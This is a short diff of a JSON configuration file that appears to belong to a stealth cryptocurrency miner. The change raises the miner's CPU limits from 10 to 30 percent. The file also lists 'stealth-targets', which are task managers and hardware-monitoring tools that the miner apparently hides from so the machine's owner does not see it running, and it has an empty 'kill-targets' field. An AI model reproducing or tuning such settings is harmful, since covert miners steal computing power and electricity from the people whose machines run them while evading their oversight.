@@ -6,9 +6,9 @@
     "password": "m07-2",
     "nicehash": false,
     "ssltls": true,
-    "max-cpu": 10,
+    "max-cpu": 30,
     "idle-wait": 30,
-    "idle-cpu": 10,
+    "idle-cpu": 30,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,cpuz.exe,anvir.exe,anvir64.exe,anvirlauncher.exe,gpu-z.exe,real-temp.exe,NVCleanstall.exe,ThrottleStop.exe",
     "kill-targets": ""
 }
